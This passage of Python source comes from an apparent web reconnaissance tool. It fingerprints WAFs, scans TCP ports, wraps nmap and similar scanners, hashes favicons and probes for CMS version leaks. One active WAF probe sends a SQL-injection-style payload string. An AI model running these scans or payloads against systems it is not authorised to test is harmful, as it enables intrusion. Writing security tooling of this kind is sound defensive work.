                                                or 'asmlastrules' in b),
    ('Barracuda',           lambda h, c, b, s: 'barra_counter_session' in c),
    ('Citrix NetScaler',    lambda h, c, b, s: 'ns_af' in c or 'pwcount' in c
                                                or 'citrix_ns_id' in c),
    ('FortiWeb',            lambda h, c, b, s: 'fortiwafsid' in c),
    ('ModSecurity / CRS',   lambda h, c, b, s: 'mod_security' in b or 'modsecurity' in b),
    ('NAXSI (nginx WAF)',   lambda h, c, b, s: 'naxsi' in b),
    ('Wallarm',             lambda h, c, b, s: 'wallarm' in h.get('server', '')),
    ('Wordfence',           lambda h, c, b, s: 'wordfence' in b or 'wordfence' in c),
    ('StackPath',           lambda h, c, b, s: 'stackpath' in h.get('server', '')),
    ('Reblaze',             lambda h, c, b, s: 'rbzid' in c),
    ('Distil / Imperva Bot',lambda h, c, b, s: 'x-distil-cs' in h),
    ('Aliyun (Yundun) WAF', lambda h, c, b, s: 'aliyungf_tc' in c),
    ('Tencent Cloud WAF',   lambda h, c, b, s: 'wzws-ray' in h or 't-sec-' in str(h)),
    ('NSFOCUS',             lambda h, c, b, s: 'nsfocus' in str(h.values())),
    ('PerimeterX',          lambda h, c, b, s: '_px' in c or 'perimeterx' in b),
    ('Datadome',            lambda h, c, b, s: 'datadome' in c or 'datadome' in b),
    ('Kona Site Defender',  lambda h, c, b, s: 'akamai-bot-manager' in str(h.values()).lower()),
    ('Yunaq',               lambda h, c, b, s: 'yunsuo_session' in c),
    ('360 Web App Firewall',lambda h, c, b, s: '360wzb' in str(h).lower()),
    ('Fastly',              lambda h, c, b, s: 'x-fastly-request-id' in h
                                                or ('x-served-by' in h and 'fastly' in b)),
    ('Azure Front Door',    lambda h, c, b, s: 'x-azure-ref' in h or 'x-azure-fdid' in h),
    ('Google Cloud Armor',  lambda h, c, b, s: h.get('via', '').endswith('google')
                                                or 'cloud armor' in b),
]


def _fp_probe_waf(url, landing_response):
    """Detect WAFs / bot-defenses / CDN shields. Passive scan of the landing
    response is augmented with one active probe carrying a benign payload
    that signature-based WAFs commonly block; we never go beyond a single
    triggering GET so this stays within the 'fingerprint, not exploit' bound."""

    detected: list[tuple[str, str]] = []
    seen: set[str] = set()

    def inspect(resp, source):
        """Run every WAF signature against a response's headers/cookies/body/
        status and record first-time matches, tagged with `source`."""
        if resp is None:
            return
        h = {k.lower(): v.lower() for k, v in resp.headers.items()}
        c = (resp.headers.get('Set-Cookie') or '').lower()
        b = (resp.text[:50_000] if hasattr(resp, 'text') else '').lower()
        s = getattr(resp, 'status_code', 0)
        for name, pred in _FP_WAF_RULES:
            try:
                if pred(h, c, b, s) and name not in seen:
                    seen.add(name)
                    detected.append((name, source))
            except Exception:
                pass

    inspect(landing_response, 'passive')

    if REQUESTS_AVAILABLE:
        try:
            r = requests.get(
                url, timeout=10, verify=False, allow_redirects=False,
                params={'reconner_probe': "1' OR '1'='1 <x>"},
                headers={'User-Agent': _FP_UA})
            inspect(r, f'triggered → HTTP {r.status_code}')
        except Exception:
            pass

    if not detected:
        return ''
    return '── WAF / CDN-shield ──\n' + '\n'.join(
        f'  • {name}  [{source}]' for name, source in detected)


def _fp_probe_ports(host):
    """Concurrent TCP-connect scan over a curated list of common service
    ports. Best-effort banner grab on whatever the service sends first."""
    open_ports: list[tuple[int, str]] = []
    lock = threading.Lock()

    def check(p):
        """TCP-connect to port `p`; if open, grab whatever banner the service
        sends first and record (port, banner). Thread-safe."""
        try:
            with socket.create_connection((host, p), timeout=1.5) as s:
                try:
                    s.settimeout(1.0)
                    banner = s.recv(120).decode('utf-8', 'ignore').strip()
                except Exception:
                    banner = ''
                with lock:
                    open_ports.append((p, banner))
        except Exception:
            pass

    threads = [threading.Thread(target=check, args=(p,), daemon=True)
               for p in _FP_COMMON_PORTS]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=3)

    if not open_ports:
        return ''
    open_ports.sort()
    out = ['── Open Ports (TCP connect) ──']
    for port, banner in open_ports:
        svc = _FP_PORT_SERVICE.get(port, '?')
        line = f'  • {port:>5}/tcp  {svc:<16}'
        if banner:
            line += f' [{banner[:60]}]'
        out.append(line)
    return '\n'.join(out)


def _fp_probe_whatweb(url):
    """Shell out to the `whatweb` CLI (aggression 3) and return its findings,
    or an error/empty note. Requires `whatweb` on PATH."""
    try:
        out = subprocess.check_output(
            ['whatweb', '--no-errors', '-a', '3', '--colour=never', url],
            stderr=subprocess.STDOUT, timeout=90).decode('utf-8', 'ignore')
        text = out.strip()
        if not text:
            return ''
        return ('── Web Application Fingerprint ──\n'
                + '\n'.join('  ' + l for l in text.splitlines()))
    except subprocess.TimeoutExpired:
        return '── Web Application Fingerprint ──\n  (timeout)'
    except Exception as e:
        return f'── Web Application Fingerprint ──\n  (error: {e})'


def _fp_probe_nmap(host):
    """Run an `nmap` service/version scan of the top 50 ports and return the
    port/service table, stripping the scanner's own banner/footer lines.
    Requires `nmap` on PATH; returns an error/empty note otherwise."""
    try:
        out = subprocess.check_output(
            ['nmap', '-sV', '-Pn', '-T4', '--top-ports', '50',
             '--version-light', host],
            stderr=subprocess.STDOUT, timeout=240).decode('utf-8', 'ignore')
        kept, keep = [], False
        for line in out.splitlines():
            low = line.lower()
            if ('nmap' in low or 'service detection performed' in low
                    or 'report any incorrect' in low):
                keep = False
                continue
            if 'PORT' in line and 'STATE' in line:
                keep = True
            if keep or line.startswith('Service Info:'):
                kept.append('  ' + line)
        if not kept:
            return ''
        return '── Network Services ──\n' + '\n'.join(kept)
    except subprocess.TimeoutExpired:
        return '── Network Services ──\n  (timeout)'
    except Exception as e:
        return f'── Network Services ──\n  (error: {e})'


def _fp_probe_httpx(url):
    """Maintained, Wappalyzer-style tech detection via ProjectDiscovery httpx
    (`-td`). Returns a list of technology strings, or None if httpx isn't
    available / found nothing. The URL is passed as the value of the `-u` flag
    in an argv list (no shell), so a hostile target can't inject a command or a
    stray flag."""
    # Prefer 'httpx-toolkit' (ProjectDiscovery's binary name on Kali/Debian,
    # which renamed it to avoid clashing with the Python 'httpx' CLI). Falls
    # back to 'httpx' where PD's tool keeps that name. If we pick the wrong
    # 'httpx', its unknown flags just error → no JSON → None (no false data).
    exe = shutil.which('httpx-toolkit') or shutil.which('httpx')
    if not exe or not url or url.startswith('-'):
        return None
    try:
        out = subprocess.check_output(
            [exe, '-u', url, '-td', '-json', '-silent',
             '-disable-update-check', '-timeout', '15'],
            stderr=subprocess.DEVNULL, timeout=60).decode('utf-8', 'ignore')
    except Exception:
        return None
    techs = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith('{'):
            continue
        try:
            obj = json.loads(line)
        except Exception:
            continue
        for t in (obj.get('tech') or obj.get('technologies') or []):
            if t and t not in techs:
                techs.append(t)
    return techs or None


def _fp_probe_webanalyze(url):
    """Fallback maintained Wappalyzer-style detection via webanalyze. Same safe
    argv-list invocation (URL as the value of `-host`)."""
    exe = shutil.which('webanalyze')
    if not exe or not url or url.startswith('-'):
        return None
    try:
        out = subprocess.check_output(
            [exe, '-host', url, '-output', 'json'],
            stderr=subprocess.DEVNULL, timeout=60).decode('utf-8', 'ignore')
    except Exception:
        return None
    techs = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith('{'):
            continue
        try:
            obj = json.loads(line)
        except Exception:
            continue
        for m in (obj.get('matches') or []):
            name = m.get('app_name') or m.get('app') or ''
            ver = m.get('version') or ''
            label = (f'{name} {ver}').strip()
            if name and label not in techs:
                techs.append(label)
    return techs or None


def _fp_probe_tech_cli(url):
    """Run a maintained tech-detection engine: httpx `-td` first, webanalyze as
    fallback. Folds the result into the Technologies report."""
    techs = _fp_probe_httpx(url)
    if not techs:
        techs = _fp_probe_webanalyze(url)
    if not techs:
        return ''
    return '── Technology Stack ──\n' + '\n'.join(f'  • {t}' for t in techs)


def _fp_probe_wafw00f(url):
    """WAF detection via wafw00f. Invoked as an argv list (no shell); the URL is
    passed as a single argument and a leading dash is refused, so a hostile
    target can't inject a command or a stray flag."""
    exe = shutil.which('wafw00f')
    if not exe or not url or url.startswith('-'):
        return ''
    try:
        out = subprocess.check_output(
            [exe, url], stderr=subprocess.DEVNULL,
            timeout=90).decode('utf-8', 'ignore')
    except Exception:
        return ''
    out = re.sub(r'\x1b\[[0-9;]*m', '', out)
    wafs = []
    for m in re.findall(r'is behind\s+(.+?)\s+WAF', out):
        w = ' '.join(m.split())
        if w and w not in wafs:
            wafs.append(w)
    if wafs:
        return '── WAF / Bot Defense ──\n' + '\n'.join(f'  • {w}' for w in wafs)
    if re.search(r'No WAF detected', out, re.I):
        return '── WAF / Bot Defense ──\n  • none detected'
    return ''


def _murmur3_32(data: bytes, seed: int = 0) -> int:
    """MurmurHash3 x86_32 (signed), matching mmh3.hash() — used for the Shodan
    favicon hash. Pure-Python so there's no dependency."""
    c1, c2 = 0xcc9e2d51, 0x1b873593
    length = len(data)
    h1 = seed & 0xffffffff
    rounded = length & ~3

    def rotl(x, r):
        """Rotate the 32-bit value `x` left by `r` bits."""
        return ((x << r) | (x >> (32 - r))) & 0xffffffff

    for i in range(0, rounded, 4):
        k1 = (data[i] | (data[i + 1] << 8)
              | (data[i + 2] << 16) | (data[i + 3] << 24)) & 0xffffffff
        k1 = (k1 * c1) & 0xffffffff
        k1 = rotl(k1, 15)
        k1 = (k1 * c2) & 0xffffffff
        h1 ^= k1
        h1 = rotl(h1, 13)
        h1 = (h1 * 5 + 0xe6546b64) & 0xffffffff
    k1 = 0
    tail = length & 3
    if tail >= 3:
        k1 ^= data[rounded + 2] << 16
    if tail >= 2:
        k1 ^= data[rounded + 1] << 8
    if tail >= 1:
        k1 ^= data[rounded]
        k1 = (k1 * c1) & 0xffffffff
        k1 = rotl(k1, 15)
        k1 = (k1 * c2) & 0xffffffff
        h1 ^= k1
    h1 ^= length
    h1 ^= h1 >> 16
    h1 = (h1 * 0x85ebca6b) & 0xffffffff
    h1 ^= h1 >> 13
    h1 = (h1 * 0xc2b2ae35) & 0xffffffff
    h1 ^= h1 >> 16
    return h1 - 0x100000000 if h1 & 0x80000000 else h1


def _fp_probe_favicon(base_url):
    """Favicon fingerprint: the Shodan-style mmh3 hash (and md5) of /favicon.ico.
    No product database — the hash itself lets you pivot to other hosts running
    the same app via `http.favicon.hash:<n>` on Shodan/Censys."""
    if not REQUESTS_AVAILABLE:
        return ''
    import base64
    try:
        r = requests.get(urljoin(base_url, '/favicon.ico'), timeout=6,
                         verify=False, headers={'User-Agent': _FP_UA})
    except Exception:
        return ''
    if r.status_code != 200 or not r.content:
        return ''
    ct = (r.headers.get('Content-Type') or '').lower()
    is_icon = ('image' in ct or 'icon' in ct
               or r.content[:4] == b'\x00\x00\x01\x00'
               or r.content[:8] == b'\x89PNG\r\n\x1a\n')
    if not is_icon:
        return ''
    mh = _murmur3_32(base64.encodebytes(r.content))
    md5 = hashlib.md5(r.content).hexdigest()
    return ('── Favicon ──\n'
            f'  • mmh3 hash: {mh}   (pivot: http.favicon.hash:{mh})\n'
            f'  • md5: {md5}   ({len(r.content)} bytes)')


def _fp_probe_http_versions(host, port, response):
    """Negotiated HTTP versions: HTTP/2 from the TLS ALPN result, and whether
    HTTP/3 is advertised via the Alt-Svc response header."""
    lines = []
    h2 = None
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(['h2', 'http/1.1'])
        with socket.create_connection((host, port), timeout=6) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ss:
                h2 = ss.selected_alpn_protocol()
    except Exception:
        h2 = None
    if h2:
        lines.append(f'  • ALPN: {h2}'
                     + ('   (HTTP/2 supported)' if h2 == 'h2' else ''))
    alt = ''
    if response is not None:
        alt = (response.headers.get('Alt-Svc')
               or response.headers.get('alt-svc') or '')
    if alt:
        tag = '   (HTTP/3 advertised)' if 'h3' in alt.lower() else ''
        lines.append(f'  • Alt-Svc: {alt[:90]}{tag}')
    if not lines:
        return ''
    return '── HTTP Protocols ──\n' + '\n'.join(lines)


# CNAME / reverse-DNS substrings → hosting / CDN / SaaS platform (categorical).
_FP_CLOUD_SIGNS = [
    ('cloudfront.net', 'AWS CloudFront (CDN)'),
    ('s3.amazonaws.com', 'AWS S3'),
    ('elb.amazonaws.com', 'AWS Elastic Load Balancing'),
    ('compute.amazonaws.com', 'AWS EC2'),
    ('amazonaws.com', 'AWS'),
    ('azureedge.net', 'Azure CDN'),
    ('azurewebsites.net', 'Azure App Service'),
    ('trafficmanager.net', 'Azure Traffic Manager'),
    ('cloudapp.azure.com', 'Azure'),
    ('cloudflare.net', 'Cloudflare'),
    ('cloudflare.com', 'Cloudflare'),
    ('pages.dev', 'Cloudflare Pages'),
    ('workers.dev', 'Cloudflare Workers'),
    ('fastly.net', 'Fastly (CDN)'),
    ('fastlylb.net', 'Fastly (CDN)'),
    ('akamaiedge.net', 'Akamai (CDN)'),
    ('akamai.net', 'Akamai (CDN)'),
    ('edgekey.net', 'Akamai (CDN)'),
    ('edgesuite.net', 'Akamai (CDN)'),
    ('netlify.app', 'Netlify'),
    ('netlify.com', 'Netlify'),
    ('vercel.app', 'Vercel'),
    ('vercel-dns.com', 'Vercel'),
    ('herokudns.com', 'Heroku'),
    ('herokuapp.com', 'Heroku'),
    ('herokussl.com', 'Heroku'),
    ('github.io', 'GitHub Pages'),
    ('githubusercontent.com', 'GitHub'),
    ('appspot.com', 'Google App Engine'),
    ('googleusercontent.com', 'Google Cloud'),
    ('ghs.googlehosted.com', 'Google (custom domain hosting)'),
    ('wpengine.com', 'WP Engine'),
    ('wordpress.com', 'WordPress.com'),
    ('myshopify.com', 'Shopify'),
    ('squarespace.com', 'Squarespace'),
    ('wixdns.net', 'Wix'),
    ('digitaloceanspaces.com', 'DigitalOcean Spaces'),
    ('readthedocs.io', 'Read the Docs'),
    ('zendesk.com', 'Zendesk'),
    ('statuspage.io', 'Atlassian Statuspage'),
    ('ghost.io', 'Ghost (Pro)'),
]


def _fp_probe_cname(host):
    """Hosting / CDN / SaaS platform inferred from the CNAME chain and the
    reverse-DNS of the target's IP(s) — points at the platform behind the name."""
    names = []
    try:
        if DNS_AVAILABLE:
            res = dns.resolver.Resolver()
            res.lifetime = 5
            cur = host
            for _ in range(6):
                try:
                    ans = res.resolve(cur, 'CNAME')
                    tgt = str(ans[0].target).rstrip('.')
                    if not tgt or tgt in names:
                        break
                    names.append(tgt)
                    cur = tgt
                except Exception:
                    break
    except Exception:
        pass
    try:
        _, aliases, ips = socket.gethostbyname_ex(host)
        names.extend(aliases)
        for ip in ips:
            try:
                names.append(socket.gethostbyaddr(ip)[0])
            except Exception:
                pass
    except Exception:
        pass
    names = list(dict.fromkeys(n for n in names if n and n != host))
    hay = ' '.join(n.lower() for n in names)
    hits = []
    for sign, label in _FP_CLOUD_SIGNS:
        if sign in hay and label not in hits:
            hits.append(label)
    # Drop the bare 'AWS' when a specific AWS service already matched.
    if 'AWS' in hits and any(h.startswith('AWS ') for h in hits):
        hits.remove('AWS')
    if not hits and not names:
        return ''
    out = ['── Hosting / CDN / SaaS ──']
    out += [f'  • {h}' for h in hits]
    if names:
        chain = ' → '.join(names)
        out.append('  Resolves via: ' + (chain[:200] + '…' if len(chain) > 200 else chain))
    return '\n'.join(out)


def _fp_probe_site_meta(base_url):
    """Discover well-known metadata files (sitemap, security.txt, humans/ads.txt).
    Each is validated by content so a soft-404 (200-for-everything SPA) doesn't
    register a false positive."""
    if not REQUESTS_AVAILABLE:
        return ''
    sess = requests.Session()
    sess.headers['User-Agent'] = _FP_UA
    checks = [
        ('/sitemap.xml', 'sitemap'),
        ('/sitemap_index.xml', 'sitemap index'),
        ('/.well-known/security.txt', 'security.txt'),
        ('/security.txt', 'security.txt'),
        ('/humans.txt', 'humans.txt'),
        ('/ads.txt', 'ads.txt'),
    ]
    found, seen = [], set()
    for path, label in checks:
        if label in seen:
            continue
        try:
            r = sess.get(urljoin(base_url, path), timeout=6, verify=False,
                         allow_redirects=True)
        except Exception:
            continue
        if r.status_code != 200 or not r.content:
            continue
        body = r.text[:2000]
        low = body.lower()
        ok = False
        extra = ''
        if 'sitemap' in label:
            ok = ('<urlset' in low or '<sitemapindex' in low
                  or low.lstrip().startswith('<?xml'))
        elif 'security.txt' in label:
            ok = 'contact:' in low or 'policy:' in low or 'begin pgp' in low
            extra = '\n'.join('      ' + l.strip() for l in body.splitlines()
                              if l.lower().startswith(('contact:', 'policy:',
                                                       'expires:')))[:300]
        elif label == 'ads.txt':
            ok = ',' in body and 'html' not in low[:40]
        else:
            ok = '<html' not in low[:60]
        if not ok:
            continue
        seen.add(label)
        line = f'  • {label}: {path}  [{len(r.content)} bytes]'
        if extra.strip():
            line += '\n' + extra
        found.append(line)
    if not found:
        return ''
    return '── Site Metadata ──\n' + '\n'.join(found)


# (path, label, version-regex or None) for exposed CMS/app version endpoints.
_FP_CMS_VERSION_PATHS = [
    ('/wp-json', 'WordPress REST API', None),
    ('/readme.html', 'WordPress', r'[Vv]ersion\s+([0-9][0-9.]+)'),
    ('/feed/', 'WordPress', r'generator="[^"]*?([0-9][0-9.]+)"'),
    ('/CHANGELOG.txt', 'Drupal', r'Drupal\s+([0-9][0-9.]+)'),
    ('/core/CHANGELOG.txt', 'Drupal', r'Drupal\s+([0-9][0-9.]+)'),
    ('/administrator/manifests/files/joomla.xml', 'Joomla',
     r'<version>\s*([0-9][0-9.]+)\s*</version>'),
    ('/package.json', 'Node package.json', r'"version"\s*:\s*"([^"]+)"'),
    ('/composer.json', 'PHP composer.json', r'"version"\s*:\s*"([^"]+)"'),
]


def _fp_probe_cms_version(base_url):
    """Probe endpoints that leak a CMS/app version (WordPress, Drupal, Joomla,
    Node, Composer). Only reports a hit when it extracts a version or sees an
    unmistakable signal — so SPA soft-404s don't create noise. Active (sends a
    handful of GETs), hence Aggressive-only."""
    if not REQUESTS_AVAILABLE:
        return ''
    sess = requests.Session()
    sess.headers['User-Agent'] = _FP_UA
    found, seen = [], set()
    for path, label, rx in _FP_CMS_VERSION_PATHS:
        try:
            r = sess.get(urljoin(base_url, path), timeout=6, verify=False,
                         allow_redirects=False)
        except Exception:
            continue
        if r.status_code not in (200, 401, 403):
            continue
        body = r.text[:20000]
        ver = ''
        if rx:
            m = re.search(rx, body)
            if not m:
                continue
            ver = m.group(1)
        elif path.startswith('/wp-json'):
            low = body[:400].lower()
            if not (r.status_code == 200 and ('"namespaces"' in low
                    or '"routes"' in low or '"name"' in low)):
                continue
            label = 'WordPress (REST API exposed)'
        key = (label, ver)
        if key in seen:
            continue
        seen.add(key)
        msg = f'  • {label}: {path}  [{r.status_code}]'
        if ver:
            msg += f'  → version {ver}'
        found.append(msg)
    if not found:
        return ''
    return '── CMS / App Versions ──\n' + '\n'.join(found)




# ─────────────────────────────────────────────
# Raw HTTP helpers (used by the Repeater / Response-editor / Fuzzer dialogs)
# ─────────────────────────────────────────────








# ─────────────────────────────────────────────
# scan — crawl + graph data
# ─────────────────────────────────────────────
# Extensions that denote a server-rendered / dynamic *page* (worth browsing).
# Anything else with an extension (js, css, json, pdf, zip, png, .bak, .env …)
# is treated as a 'file'; an extensionless path segment is a 'dir'.
PAGE_EXT = (
    '.php', '.php3', '.php4', '.php5', '.phtml',
    '.asp', '.aspx', '.ashx', '.asmx', '.jsp', '.jspx',
    '.do', '.action', '.cfm', '.cgi', '.pl',
    '.html', '.htm', '.shtml', '.xhtml',
    '.py', '.rb',
)

# Substrings that mark a URL/path as a likely API endpoint (used to filter the
# many string literals found in HTML/JS down to interesting endpoints).
# Common multi-label public suffixes, so api.example.co.uk resolves to the
# registrable domain example.co.uk (not co.uk). Not the full PSL — just the
# everyday ones — which is enough to keep subdomain scoping sane.
_MULTI_TLDS = frozenset((
    'co.uk', 'org.uk', 'gov.uk', 'ac.uk', 'me.uk', 'co.jp', 'or.jp', 'ne.jp',
    'com.au', 'net.au', 'org.au', 'com.br', 'net.br', 'gov.br', 'com.cn',
    'net.cn', 'org.cn', 'com.mx', 'com.ar', 'com.co', 'co.in', 'co.za',
    'co.nz', 'co.kr', 'com.tr', 'com.sg', 'com.hk', 'com.tw', 'co.id',
    'com.my', 'com.ph', 'com.ua', 'com.pl', 'com.es', 'com.pe', 'com.ve',
))


def _host_only(netloc: str) -> str:
    """Hostname from a netloc, stripping any :port and IPv6 brackets."""
    netloc = (netloc or '').strip().lower()
    if netloc.startswith('['):
        return netloc[1:].split(']', 1)[0]
    if netloc.count(':') == 1:
        host, port = netloc.split(':')
        return host if port.isdigit() else netloc
    return netloc


def node_status_label(node) -> str:
    """Human-readable status for the inspector that keeps the three facts a bare
    status_code conflates apart: a real HTTP status, a transport error (request
    never landed), and an unsent observed request. Used by the InfoPanel."""
    state = getattr(node, 'probe_state', 'ok')
    if state == 'error':
        why = getattr(node, 'error_reason', '') or 'no response'
        return f'ERROR — {why}'
    if state == 'unsent':
        return 'NOT SENT — unsafe method (open in Repeater)'
    sc = node.status_code
    return str(sc) if sc is not None else '—'


def node_is_failed(node) -> bool:
    """True for nodes that should be flagged in the map as a failure state: a
    transport error (no response), or a server-side error/unavailable response
    (HTTP 5xx, e.g. a 503 from a gateway whose upstream is down). 4xx are NOT
    failures — 401/403/404 are legitimate, informative attack surface."""
    if getattr(node, 'probe_state', 'ok') == 'error':
        return True
    sc = node.status_code
    return isinstance(sc, int) and sc >= 500


# ISO-639-1 language codes used to recognise a locale path segment so that
# per-locale variants of the same endpoint (…/en/auth, …/pt/auth, …/ar-MA/auth)
# can be collapsed into one representative node. A curated list (not "any two
# letters") keeps it from folding non-locale segments like /eu/ regions only
# when they're genuine language codes — and collapsing only ever happens when
# two or more variants of the same canonical path actually appear.
_ISO_639_1 = frozenset((
    'aa ab ae af ak am an ar as av ay az ba be bg bh bi bm bn bo br bs ca ce ch '
    'co cr cs cu cv cy da de dv dz ee el en eo es et eu fa ff fi fj fo fr fy ga '
    'gd gl gn gu gv ha he hi ho hr ht hu hy hz ia id ie ig ii ik io is it iu ja '
    'jv ka kg ki kj kk kl km kn ko kr ks ku kv kw ky la lb lg li ln lo lt lu lv '
    'mg mh mi mk ml mn mr ms mt my na nb nd ne ng nl nn no nr nv ny oc oj om or '
    'os pa pi pl ps pt qu rm rn ro ru rw sa sc sd se sg si sk sl sm sn so sq sr '
    'ss st su sv sw ta te tg th ti tk tl tn to tr ts tt tw ty ug uk ur uz ve vi '
    'vo wa wo xh yi yo za zh zu'
).split())

_LOCALE_SEG = re.compile(r'^([a-z]{2})(?:-[a-zA-Z]{2,4})?$')


def _locale_of(url: str):
    """Return (locale_token, segment_index) for the first path segment that is a
    language locale (e.g. 'en', 'pt', 'ar-MA', 'en-br'), or (None, -1). Only the
    2-letter base must be a known ISO-639-1 code; a region/script suffix is kept
    as part of the token but not validated."""
    try:
        segs = urlparse(url).path.strip('/').split('/')
    except Exception:
        return None, -1
    for i, seg in enumerate(segs):
        m = _LOCALE_SEG.match(seg)
        if m and m.group(1) in _ISO_639_1:
            return seg, i
    return None, -1


def _canonical_locale_url(url: str):
    """The URL with its first locale path segment replaced by a '{lc}' placeholder
    — a key under which all locale variants of one endpoint coincide — together
    with the detected locale. Returns (None, None) when there is no locale
    segment (so non-localised URLs are never collapsed)."""
    loc, idx = _locale_of(url)
    if loc is None:
        return None, None
    pu = urlparse(url)
    segs = pu.path.strip('/').split('/')
    segs[idx] = '{lc}'
    canon = pu._replace(path='/' + '/'.join(segs)).geturl()
    return canon, loc


def _registrable_domain(host: str) -> str:
    """eTLD+1 of a hostname (heuristic, no PSL): example.com, example.co.uk.
    IP literals and single-label hosts are returned unchanged (exact match)."""
    host = _host_only(host).strip('.')
    if not host or ':' in host:
        return host
    # IPv4 literal — match exactly.
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host):
        return host
    parts = host.split('.')
    if len(parts) <= 2:
        return host
    if '.'.join(parts[-2:]) in _MULTI_TLDS:
        return '.'.join(parts[-3:])
    return '.'.join(parts[-2:])


def _compile_scope_pattern(text: str):
    """Compile a scope glob/regex into a case-insensitive fullmatch pattern, or
    None when empty. '*' is a wildcard; comma/newline separates OR'd alternatives
    (e.g. 'https://*.example.com/page1/*'). Shared by the scanner (crawl gate) and
    the graph panel (display filter)."""
    text = (text or '').strip()
    if not text:
        return None
    pats = [p.strip() for p in re.split(r'[,\n]', text) if p.strip()]
    if not pats:
        return None
    rx = '|'.join('(?:%s)' % re.escape(p).replace(r'\*', '.*') for p in pats)
    try:
        return re.compile('(?:%s)\\Z' % rx, re.IGNORECASE)
    except Exception:
        return None


class SafePathWhitelist:
    """Allowlist of 'safe' URL paths, controlling where the crawler may perform
    state-changing interactions (control clicks, form submits, non-GET replays/
    probes). Passive GET navigation is never gated by this.

    Each line is a glob matched against the URL path (with its query): '*' is a
    wildcard, '#' starts a comment, blank lines are ignored. A rule without a
    leading '/' is anchored at the start of the path anyway. When disabled,
    everything is allowed; when enabled with no rules, nothing is allowed (a
    read-only crawl)."""

    def __init__(self, text: str = '', enabled: bool = True):
        """Build from the raw textbox content and the on/off flag."""
        self.enabled = bool(enabled)
        self.raw = text or ''
        self._rx = self._compile(self.raw)
        # Exact (non-glob) rules the user typed — deliberate full paths that
        # override the destructive veto (a glob like '*delete*' never does).
        self._exact_rx = self._compile_exact(self.raw)
        # Concrete paths added at scan time when the crawler auto-probed a
        # heuristically-safe endpoint — an auditable record of what was touched.
        self.dynamic: list = []
        self._dyn_seen: set = set()

    @staticmethod
    def _compile(text: str):
        """Compile the non-comment lines into one case-insensitive fullmatch
        regex, or None when there are no usable rules."""
        rules = []
        for line in (text or '').splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if not line.startswith('/') and '://' not in line:
                line = '/' + line
            rules.append(line)
        if not rules:
            return None
        rx = '|'.join('(?:%s)' % re.escape(r).replace(r'\*', '.*') for r in rules)
        try:
            return re.compile('(?:%s)\\Z' % rx, re.IGNORECASE)
        except Exception:
            return None

    @staticmethod
    def _compile_exact(text: str):
        """Compile only the exact (non-glob, no '*') rules — deliberate full paths
        the user typed. A match here overrides the destructive veto; wildcard
        rules and the read-verb defaults never override."""
        rules = []
        for line in (text or '').splitlines():
            line = line.strip()
            if not line or line.startswith('#') or '*' in line:
                continue
            if not line.startswith('/') and '://' not in line:
                line = '/' + line
            rules.append(line)
        if not rules:
            return None
        rx = '|'.join('(?:%s)' % re.escape(r) for r in rules)
        try:
            return re.compile('(?:%s)\\Z' % rx, re.IGNORECASE)
        except Exception:
            return None

    @staticmethod
    def _path_of(url: str) -> str:
        """The path(+query) of a URL, used for matching and for recording."""
        try:
            pu = urlparse(url)
            return (pu.path or '/') + (('?' + pu.query) if pu.query else '')
        except Exception:
            return url or '/'

    def allows(self, url: str) -> bool:
        """True if a state-changing interaction with `url` is permitted: always
        when disabled, otherwise only when the URL's path(+query) matches a rule
        (so an enabled-but-empty list permits nothing). Dynamically-added paths
        count as matches too."""
        if not self.enabled:
            return True
        path = self._path_of(url)
        if path in self._dyn_seen:
            return True
        if self._rx is None:
            return False
        return bool(self._rx.match(path) or self._rx.match(url or ''))

    def is_explicit(self, url: str) -> bool:
        """True if `url`'s path matches an exact (non-glob) rule the user typed —
        a deliberate opt-in that overrides the destructive veto so the crawler
        will auto-send it. Only honoured while the whitelist is enabled."""
        if not self.enabled or self._exact_rx is None:
            return False
        path = self._path_of(url)
        return bool(self._exact_rx.match(path) or self._exact_rx.match(url or ''))

    def add(self, url: str) -> bool:
        """Record a concrete path the crawler auto-probed, so it's part of the
        live whitelist (and auditable). Returns True the first time a given path
        is added."""
        path = self._path_of(url)
        if path in self._dyn_seen:
            return False
        self._dyn_seen.add(path)
        self.dynamic.append(path)
        return True


# Substrings that mark a URL as an API/data endpoint rather than a page or
# static asset. Kept broad and *categorical* (REST roots, RPC, GraphQL, auth,
# schemas, data shapes, platform conventions) so discovery generalises across
# sites instead of matching one product. Over-matching is cheap: a guessed
# endpoint that turns out to return the HTML shell is dropped automatically by
# the SPA-fallback filter, so only real (non-HTML) endpoints survive.
API_HINTS = (
    # REST / RPC / generic service roots
    '/api', '/apis/', '/rest', '/restapi', '/rpc', '/jsonrpc', '/json-rpc',
    '/services/', '/service/', '/svc/', '/ws/', '/webservice', '/ajax',
    '/xhr/', '/backend/', '/internal/', '/private/', '/public/api',
    # GraphQL
    'graphql', '/gql', '/graphiql',
    # Versioned APIs (v1..v9, plus /api/v…)
    '/v1/', '/v2/', '/v3/', '/v4/', '/v5/', '/v6/', '/v7/', '/v8/', '/v9/',
    '/api/v', '/api-v',
    # Auth / identity
    '/oauth', '/auth/', '/authenticate', '/token', '/session', '/sso',
    '/openid', '/saml', '/.well-known/', '/userinfo',
    # Schemas / docs / discovery
    '/swagger', '/openapi', '/api-docs', '/apidocs', '/redoc', '/wsdl',
    '/odata', '/_schema', '/schema.json',
    # Data shapes / formats
    '.json', '.xml', '/json', '/feed', '/rss', '/atom', '/data/', '/query',
    '/graph/', '/search', '/export', '/download',
    # CMS / framework data conventions
    '/wp-json', '/wp-admin/admin-ajax.php', '/_next/data/', '/page-data/',
    '/__data.json', '/index.json', '/manifest.json',
    # Modern API conventions (serverless / RPC / gateways)
    '/trpc/', '/.netlify/functions/', '/.netlify/', '/functions/v1/',
    '/edge-functions/', '/bff/', '/gateway/', '/graphql/', '/hasura/',
)

# Substrings that DISQUALIFY a URL from being an API endpoint even if it would
# otherwise match a hint (query string, .json, …). These are framework/media
# plumbing — image optimizers, tracking/telemetry, service workers — that flood
# the graph with noise. Kept categorical so it generalises across sites, not one
# product. Checked against the full URL (so query-string proxies are caught too).
API_NOISE = (
    # Image optimizers / media proxies — never an application API
    '/_next/image', '/_vercel/image', '/_ipx/', '/_image?', '/cdn-cgi/image/',
